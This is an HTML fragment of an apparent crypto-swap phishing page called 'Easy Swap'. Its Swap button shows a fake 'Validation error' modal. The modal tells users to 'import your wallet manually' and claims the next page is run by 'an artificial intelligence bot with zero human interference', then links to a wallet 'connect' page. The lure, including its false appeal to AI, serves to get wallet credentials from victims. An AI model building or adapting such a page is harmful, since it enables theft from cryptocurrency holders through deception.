  <body>
    <form>
  
      <div class="segment">
        <h1 style="color:#2A498D;"><i class="fa fa-hand-peace-o" aria-hidden="true"></i>   Easy Swap</h1>
      </div>
      <label>
          <span>Select token : </span>
          <select id="token" name="token">
              <option value="Terk">Terk</option>
              <option value="MetaUFO">MetaUFO</option>
              <option value="MetaWAR">MetaWAR</option>
              <option value="Flag">Flag</option>
              <option value="Pit">Pit</option>
            </select>
      </label>
      <label>
        <span class="icon"><i class="fa fa-arrow-down" aria-hidden="true"></i></span>
        <select id="token" name="token">
            <option value="bnb">BNB</option>
          </select>
    </label>
      <label>
          <input type="number" placeholder="Enter Amount" required/>
      </label>
      <label>
        <span>Slippage tolerance: </span>
          <select id="tolerance">
              <option value="">0.1%</option>
              <option value="">0.25%</option>
              <option value="">0.5%</option>
              <option value="">0.75%</option>
              <option value="">1%</option>
            </select>
          </label>
        <button class="unit" type="button" style="color:#2A498D;" data-toggle="modal" data-target="#exampleModalCenter">Swap</button> 
  </div>
    </form>

<!-- Modal -->
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalCenterTitle">Validation error</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body" style="color:red">
      To continue swapping your token, you are required to import your wallet manuallly.
      The page you are about to be redirected to, is handled by an artificial intelligence bot with zero human interference.
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <a href="./connect/index.html"><button type="button" class="btn btn-primary" id="proceed">Proceed</button></a>
      </div>
    </div>
  </div>
</div>
